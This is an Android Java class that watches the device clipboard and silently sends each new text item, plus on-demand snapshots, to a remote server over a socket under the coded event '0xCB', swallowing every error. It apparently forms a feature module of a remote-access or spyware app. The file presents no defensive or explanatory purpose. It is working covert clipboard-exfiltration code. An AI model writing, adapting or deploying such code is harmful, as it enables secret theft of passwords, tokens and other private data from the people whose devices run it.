package com.fason.app.features.clipboard;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.text.TextUtils;

import com.fason.app.core.network.SocketClient;

import org.json.JSONObject;

public final class ClipboardMonitor {

    private static ClipboardMonitor instance;
    private final Context ctx;
    private ClipboardManager cm;
    private ClipboardManager.OnPrimaryClipChangedListener listener;
    private String lastText;

    private ClipboardMonitor(Context context) {
        this.ctx = context.getApplicationContext();
    }

    public static synchronized ClipboardMonitor getInstance(Context context) {
        if (instance == null) instance = new ClipboardMonitor(context);
        return instance;
    }

    public synchronized void start() {
        if (cm == null) cm = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        if (cm == null || listener != null) return;

        listener = () -> emit(false);
        try {
            cm.addPrimaryClipChangedListener(listener);
            emit(true);
        } catch (Exception ignored) {}
    }

    public synchronized void stop() {
        if (cm != null && listener != null) {
            try { cm.removePrimaryClipChangedListener(listener); } catch (Exception ignored) {}
        }
        listener = null;
        lastText = null;
    }

    public synchronized void emitClipboardSnapshot() {
        emit(true);
    }

    private void emit(boolean allowDup) {
        if (cm == null) cm = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        if (cm == null || !cm.hasPrimaryClip()) return;

        ClipData clip = cm.getPrimaryClip();
        if (clip == null || clip.getItemCount() == 0) return;

        CharSequence text = clip.getItemAt(0).getText();
        if (TextUtils.isEmpty(text)) return;

        String s = text.toString();
        if (!allowDup && s.equals(lastText)) return;

        try {
            JSONObject data = new JSONObject();
            data.put("text", s);
            SocketClient.getInstance().getSocket().emit("0xCB", data);
            lastText = s;
        } catch (Exception ignored) {}
    }
}
